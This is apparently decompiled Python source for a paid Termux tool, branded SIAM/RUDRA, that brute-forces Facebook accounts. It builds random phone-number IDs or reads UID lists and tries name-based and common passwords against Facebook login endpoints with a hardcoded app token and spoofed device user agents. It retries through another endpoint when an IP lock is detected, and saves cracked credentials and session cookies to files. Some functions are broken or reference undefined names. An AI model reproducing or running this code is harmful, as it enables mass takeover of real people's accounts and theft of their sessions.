'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
VAPP = random.randint(410000000, 499999999)
gtt = random.choice(xxxxx)
gttt = random.choice(xxxxx)
uayx = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) [FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{{density=3.3,width=1080,height=1430}};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
myid = uuid.uuid4().hex[:40].upper()
idmy = uuid.uuid4().hex[:6].upper()
try:
    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt', 'r').read()
except:
    with open('/data/data/com.termux/files/usr/lib/.myawm.txt', 'w') as getx:
        getx.write(myid + idmy)
        getx.close()

MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt', 'r').read()

class apvroval:
    def check(self):
        url = 'https://raw.githubusercontent.com/SIAM-TEAM-143/Ff-kil/refs/heads/main/APPROVAL.txt'
        try:
            import mechanize
            my_awm = mechanize.Browser()
            host = my_awm.open(url)
            check_key = str(host.read())
            if MY_KEY in check_key:
                Main()
                return
            clear()
            logo2 = 'YOUR KEY>>> ' + MY_KEY
            logo()
            print(logo2)
            input('>>>>PRESS ENTER TO SEND KEY\x1b[0;97m')
            input('\x1b[0;97m\x1b[10;97m[\x1b[92;1mâ—\x8f\x1b[10;97m] \x1b[0;41mPRESS ENTER TO SEND ADMIN\x1b[0;97m')
            appv = 'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + MY_KEY
            (os.system('am start https://t.me/Siamking999?text=' + appv), approval())
            time.sleep(59)
        except Exception as e:
            print(e)
            exit()

from rich.progress import track

def lood(message):
    for a in track(range(250), description=message):
        time.sleep(0.02)

def clear():
    os.system('clear')

def server():
    try:
        database = requests.get('https://raw.githubusercontent.com/SIAM-TEAM-143/Server/refs/heads/main/Server.txt').text
        if 'on' in database:
            return
        elif 'off' in database:
            print(' [✓] TOOL IS OFF')
            sys.exit()
        elif 'update' in database:
            print(' [✓] TOOL IS UPDATE ')
            sys.exit()
        else:
            while True:
                print(' TOOL IS ON UPDATE')
    except:
        print(' Internet Error [✓] ')
        sys.exit()

server()
clear()
print('[✓]\x1b[34;1m TOOL IS ON')
lood('W8 FOR MENU')

RUDRA_XD = requests.get('https://raw.githubusercontent.com/SIAM-TEAM-143/Version/main/Version.text').text.splitlines()
version = random.choice(RUDRA_XD)

def vixua():
    END = '[FBAN/FB4A; FBAV/393.0.0.47.1 97: FBBV/99301135; FBDM/(density-3.5.width-1280,height=2160): FBLC/ru_RU; FBRV/944208737; FBCR/LTE: FBMF/Xiaom1;FBBD/X1201; FBPN/com.f acebook. katana, FBDV/Poco F4; FBSV/13; FBOP/1; FBCA/armeabi-v7aj'
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';' + END
    return ua

def vipuua():
    u1 = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36'
    u2 = 'Mozilla/5.0 (Linux; Android 14; Infinix X6532 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/501.0.0.61.108;]'
    u3 = 'Mozilla/5.0 (Linux; Android 13; SM-A037F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36'
    u4 = 'Mozilla/5.0 (Linux; Android 14; V2332 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/496.0.0.67.109;]'
    u5 = "Mozilla/5.0 (Linux; Android 13; RMX3761 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.115 Mobile Safari/537.36 "
    u6 = "Mozilla/5.0 (Linux; Android 14; SM-A135F Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.115 Mobile Safari/537.36 "
    u7 = "Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.115 Mobile Safari/537.36 "
    u8 = "Mozilla/5.0 (Linux; U; Android 5.1; en-gb; OPPO F1s Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 "
    u9 = "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 "
    u10 = "Mozilla/5.0 (Linux; Android 15; CPH2465 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.89 Mobile Safari/537.36 "
    u11= "Mozilla/5.0 (Linux; Android 7.0; Infinix X603 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.193 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/465.0.0.11.109;FBCX/modulariab"
    ck = random.choice([u1, u2, u3, u4, u5, u6, u7, u8, u9, u10, u11])
    return str(ck)

def logo():
    os.system('clear')
    print(''.join(['\r\r\x1b[1;97m', f'{W}', '\n   _|_|_|  _|_|_|    _|_|    _|      _|  \n _|          _|    _|    _|  _|_|  _|_|  \n   _|_|      _|    _|_|_|_|  _|  _|  _|  \n       _|    _|    _|    _|  _|      _|  \n _|_|_|    _|_|_|  _|    _|  _|      _|  \n                                                                               \n', f'{R}', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', f'{A}', '[', f'{R}', '=', f'{A}', '] ', f'{G}', 'FACEBOOK   ', f'{R}', ' >>   ', f'{A}', ' SIAM\n', f'{A}', '[', f'{R}', '=', f'{A}', '] ', f'{G}', 'STATUS      ', f'{R}', '>>   ', f'{A}', 'PAID\n', f'{A}', '[', f'{R}', '=', f'{A}', '] ', f'{G}', 'VERSION   ', f'{R}', '  >>   ', f'{A}', '6.1 \n', f'{G}', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━']))

def Main():
    logo()
    print(f'{G}[{R}1{G}]{A} FILE CLONE')
    print(f'{G}[{R}2{G}]{A} RANDOM {G}BANGLADESH {R}CLONE')
    print(f'{G}[{R}3{G}]{A} INDIA CLONE')
    line()
    ghx = input(' ~/>>Choice >>>>: {G}')
    if ghx in ('A', 'a', '1'):
        rudrafile()
        return
    elif ghx in ('B', 'b', '2'):
        rcd.append('2')
        rmenu1()
        return
    elif ghx in ('C', 'c', '3'):
        rcd.append('3')
        rmenu1()
        return
    line()
    print('\n \t {R}Choose valid option{E}')
    time.sleep(1)
    Main()

def rmenu1():
    logo()
    if '1' in rcd:
        print(f'{rudrafile}')
        line()
    if '2' in rcd:
        print(f'{BDX}')
        line()
    if '3' in rcd:
        print(f'{INDX}')
        line()
    code = input(f'{chc}')
    print(f'{G}----------------------------------------')
    print(f'{LIMITX}')
    line()
    limit = int(input(f'[{G}+{E}] Limit : {G}'))
    print(f'{G}----------------------------------------')
    print(f'{CPG}')
    line()
    cx = input(f'[{chc}')
    if cx in ('n', 'N', 'no', 'NO', '2'):
        cpx.append('n')
    else:
        cpx.append('y')
    print(f'{W}----------------------------------------')
    print(f'{CKIG}')
    line()
    ckiv = input(f'{chc}')
    if ckiv in ('n', 'N', 'no', 'NO', '2'):
        cokix.append('n')
    else:
        cokix.append('y')
    for number in range(limit):
        if '1' in rcd:
            numberx = ''.join(random.choice(string.digits) for _ in range(8))
            xode.append(numberx)
        if '2' in rcd:
            numberx = ''.join(random.choice(string.digits) for _ in range(7))
            xode.append(numberx)
        if '3' in rcd:
            if True:
                numberx = ''.join(random.choice(string.digits) for _ in range(6))
                xode.append(numberx)
                continue
    with ThreadPool(max_workers=40) as rudrax:
        tid = str(len(xode))
        logo()
        print(f' [{G}•{W}] TOTAL ID :\x1b[1;92m {tid}')
        print(f' {W}[{G}•{W}] \x1b[1;97m{G}SIM CODE : \x1b[1;92m{code}')
        print(f' {W}[{G}•{W}] \x1b[1;37m{R}THE PROCESS HAS BEEN STARTED')
        print(f' [{G}•{W}] \x1b[1;37m{A}USE AEROPLANE MODE IN EVERY 5 MIN ')
        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for rngx in xode:
            id = code + rngx
            if '1' in rcd:
                psd = [id, rngx, id[:6], id[:7], id[:8], id[5:], 'free fire', 'bangladesh', 'mim1234', 'sadiya12', ' i love you']
            if '2' in rcd:
                psd = [id, rngx, id[5:], 'khan123']
            if '3' in rcd:
                psd = [id, rngx, id[:6], '57273200']
            rudrax.submit(graphrm, id, psd, tid)

def rudrafile():
    clear()
    logo()
    print(f'{xd} EXAMPLE {R}:{G} /sdcard/filename.txt ')
    line()
    file = input(f'{xdx} ENTER FILE NAME {R}:{W} ')
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        line()
        logo()
        print(f'{xd} FILE LOCATION NOT FOUND ')
        line()
        time.sleep(1)
        print(f'{xd} TRY AGAIN BROTHER')
        time.sleep(1)
        ____filemenu____() # This function is not defined in the disassembly
        return
    clear()
    logo()
    print(f'{xd1} AUTO PASSWORD CLONING ')
    print(f'{xd2} MANUAL PASSWORD CLONING')
    line()
    ppp = input(f'{xdx} SELECTION {R}:{W} ')
    if ppp in ('1', '01'):
        plist.append('firstslast')
        plist.append('first last')
        plist.append('first123')
        plist.append('first1234')
        plist.append('first12345')
        plist.append('first@123')
        plist.append('first@@##')
        plist.append('first1122')
        plist.append('last123')
        plist.append('Firstlast')
        plist.append('First last')
    else:
        clear()
        logo()
        print(f'{xd} EXAMPLE {R}:{G} BANGLADESH 5-30 {R}|{G} OTHERS 5-10')
        line()
        try:
            ps_limit = int(input(f'{xdx} PASSWORDS LIMIT {R}:{W} '))
        except:
            ps_limit = 5
        clear()
        logo()
        print(f'{xd} EXAMPLE {R}:{G} firstlast {R}|{G} first12 {R}|{G} first123 ')
        line()
        for i in range(ps_limit):
            plist.append(input(f'{xd} PASSWORD NO{i + 1} {R}:{W} '))
    clear()
    logo()
    print(f'{xd1} METHOD M1 {R}[{W}API{R}] ')
    print(f'{xd2} METHOD M2 {R}[{W}GRAPH{R}] ')
    line()
    method_choice = input(f'{xdx} SELECT METHOD {R}:{W} ')
    if method_choice in ('1', '01'):
        methods.append('M1')
    elif method_choice in ('2', '02'):
        methods.append('M2')
    with ThreadPool(max_workers=30) as rudray:
        clear()
        total_ids = str(len(fo))
        logo()
        print(f'{xd} TOTAL FILE UID {R}:{W} {total_ids} ')
        print(f'{xd} IF NO RESULT ON{R}|{G}OFF AIRPLANE MODE')
        print(f'{xd} YOUR CLONING STARTED{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}.')
        line()
        for user in fo:
            ids, names = user.split('|')
            passlist = plist
            if 'M1' in methods:
                rudray.submit(___methodM1___, ids, names, passlist)
            elif 'M2' in methods:
                 rudray.submit(___methodM2___, ids, names, passlist)
    print('\x1b[1;37m')
    line()
    print(f'{xd} THE PROCESS HAS COMPLETED')
    print(f'{xd} TOTAL OK{R}|{G}CP {R}:{W} {str(len(oks))}{R}|{W}{str(len(cps))}')
    line()
    exit()

def ___methodM1___(ids, names, passlist):
    try:
        uc = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]'
        sys.stdout.write(''.join(['\r', f'{xd}', f'{W}', '-', f'{R}', '[', f'{G}', 'SIAM-M1', f'{R}', ']', f'{W}', '-', f'{R}', '[', f'{W}', '%s' % loop, f'{R}', ']', f'{W}', '-', f'{R}', '[', f'{G}', '%s' % len(oks), f'{R}', ']', f'{W}', '-', f'{R}', '[', f'{Y}', '%s' % len(cps), f'{R}', '] ']))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            random_seed = random.Random()
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
            headers = {'User-Agent': vipuua(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url = 'https://api.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                cookies = ';'.join(f'{i["name"]}={i["value"]}' for i in po['session_cookies'])
                print('\r', f'{xd}', f'{W}', '-', f'{R}', '[', f'{G}', 'RUDRA-OK', f'{R}', ']', f'{G}', ' ', ids, ' | ', pas, '\x1b[1;97m')
                print('\r', f'{xd}', f'{W}', '-', f'{R}', '[', f'{G}', '🍪', f'{R}', ']', f'{W}', ' ', cookies)
                linex()
                open('/sdcard/RUDRA-FILE-M1-OK.txt', 'a').write(ids + '|' + pas + '|' + cookies + '\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print('\r', f'{xd}', f'{W}', '-', f'{R}', '[', f'{Y}', 'RUDRA-CP', f'{R}', ']', f'{Y}', ' ', ids, ' | ', pas, '\x1b[1;97m')
                open('/sdcard/RUDRA-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass

def ___methodM2___(ids, names, passlist):
    try:
        sys.stdout.write(''.join(['\r', f'{xd}', f'{W}', '-', f'{R}', '[', f'{G}', 'SIAM-M2', f'{R}', ']', f'{W}', '-', f'{R}', '[', f'{W}', '%s' % loop, f'{R}', ']', f'{W}', '-', f'{R}', '[', f'{G}', '%s' % len(oks), f'{R}', ']', f'{W}', '-', f'{R}', '[', f'{Y}', '%s' % len(cps), f'{R}', '] ']))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            _____useragentxx_____ = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
            data = {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
            headers = {'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': _____useragentxx_____, 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '329'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                cookies = ';'.join(f'{i["name"]}={i["value"]}' for i in po['session_cookies'])
                print('\r', f'{xd}', f'{W}', '-', f'{R}', '[', f'{G}', 'RUDRA-OK', f'{R}', ']', f'{G}', ' ', ids, ' | ', pas, '\x1b[1;97m')
                print('\r', f'{xd}', f'{W}', '-', f'{R}', '[', f'{G}', '🍪', f'{R}', ']', f'{W}', ' ', cookies)
                linex()
                open('/sdcard/RUDRA-FILE-M2-OK.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print('\r', f'{xd}', f'{W}', '-', f'{R}', '[', f'{Y}', 'RUDRA-CP', f'{R}', ']', f'{Y}', ' ', ids, ' | ', pas, '\x1b[1;97m')
                open('/sdcard/RUDRA-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass

lk = []

def graphrm(id, psd, tid):
    togg = []
    sys.stdout.write(f'\r{G}[RUDRA{Y}-{R}M1]{G}[{lop}]{G}  |{G} OK: {len(ok)}{R} | CP: {len(cp)}{G}')
    for psw in psd:
        ua_st = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';Dalvik/2.1.0 (Linux; U; Android 14; Infinix X669 Build/UP1A.231005.007; wv) [FBAN/Orca-Android;FBAV/418.0.0.6.105;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/588686349;FBCR/NTA;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/14;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2436};FB_FW/1;]'
        vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
        VAPP = random.randint(410000000, 499999999)
        gtt = random.choice(xxxxx)
        gttt = random.choice(xxxxx)
        uaa = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) [FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{{density=3.3,width=1080,height=1430}};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
        datax = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': id, 'password': psw, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
        header = {'User-Agent': vipuua(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
        twfx = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False).json()
        if 'session_key' in lo:
            cki = lo['session_cookies']
            ck = {}
            for xk in cki:
                ck.update({xk['name']: xk['value']})
            coki = ';'.join(f'{key}={value}' for key, value in ck.items())
            iid = re.findall('c_user=(.*);xs', coki)[0]
            print(f'\r\r{G}[RUDRA-OK] {iid} | {psw}{W}')
            os.system('espeak -a 300 "ok id"')
            ok.append(id)
            open('/sdcard/RUDRA-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
            if 'y' in cokix:
                print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}')
                print(f'{W}----------------------------------------{E}')
            break
        elif twfx in str(lo):
            iid = lo['error']['error_data']['uid']
            print(f'\r\r{BL}[RUDRA-2F] {iid} | {psw}{W}')
            os.system('espeak -a 300 "two,f id"')
            open('/sdcard/RUDRA-2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + '\n')
            twf.append(id)
            break
        elif 'www.facebook.com' in lo['error']['message']:
            try:
                iid = lo['error']['error_data']['uid']
                if iid in ok:
                    break
                if 'y' in cpx:
                    print(f'\r\r{R}[RUDRA-CP] {iid} | {psw}{W}')
                    cp.append(id)
                    os.system('espeak -a 300 "cp id"')
                    open('/sdcard/RUDRA-CP.txt', 'a').write(iid + ' | ' + psw + ' | ' + '\n')
            except:
                iid = id
            break
        else:
            continue
    loop += 1

def graphr22m(id, psd, tid):
    for psw in psd:
        sys.stdout.write(f'\r{G}[RUDRA{Y}-{R}M1]{G}[{lop}]{G}  |{G} OK: {len(ok)}{R} | CP: {len(cp)}{G}')
        sys.stdout.flush()
        datax = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': id, 'password': psw, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
        header = {'User-Agent': vipuua(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
        res = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False).json()
        if 'session_key' in res:
            ck = {c['name']: c['value'] for c in res['session_cookies']}
            coki = ';'.join(f'{k}={v}' for k, v in ck.items())
            iid = re.findall('c_user=(.*);xs', coki)[0]
            print(f'\n[RUDRA-OK] {iid} | {psw}')
            ok.append(id)
            open('/sdcard/RUDRA-OK.txt', 'a').write(f'{iid} | {psw} | {id} --> {coki}\n')
            break
        elif 'Login approval' in str(res):
            iid = res['error']['error_data']['uid']
            print(f'\n[RUDRA-2F] {iid} | {psw}')
            twf.append(id)
            open('/sdcard/RUDRA-2F.txt', 'a').write(f'{iid} | {psw}\n')
            break
        elif 'Please try again later' in str(res) or 'login' in str(res.get('error', {}).get('message', '')).lower():
            print('\n[!] IP Locked Detected — Retrying via b-api Method')
            alt_headers = {'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': vipuua(), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            payload = f'access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&email={id}&password={psw}&format=json&device_id={uuid.uuid4()}&generate_session_cookies=1&locale=en_US&method=auth.login'
            res2 = requests.post('https://b-api.facebook.com/method/auth.login', data=payload, headers=alt_headers).json()
            if 'session_key' in res2:
                coki = ';'.join(f'{i["name"]}={i["value"]}' for i in res2['session_cookies'])
                iid = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\n[RUDRA-OK-BAPI] {iid} | {psw}')
                ok.append(id)
                open('/sdcard/RUDRA-OK.txt', 'a').write(f'{iid} | {psw} | {id} --> {coki}\n')
                break
            elif 'www.facebook.com' in res2.get('error_msg', ''):
                iid = id
                print(f'\n[RUDRA-CP-BAPI] {iid} | {psw}')
                cp.append(id)
                open('/sdcard/RUDRA-CP.txt', 'a').write(f'{iid} | {psw}\n')
                break
            continue
        elif 'www.facebook.com' in res['error']['message']:
            try:
                iid = res['error']['error_data']['uid']
            except:
                iid = id
            print(f'\n[RUDRA-CP] {iid} | {psw}')
            cp.append(id)
            open('/sdcard/RUDRA-CP.txt', 'a').write(f'{iid} | {psw}\n')
            break
        else:
            continue
    loop += 1

if __name__ == '__main__':
    Main()
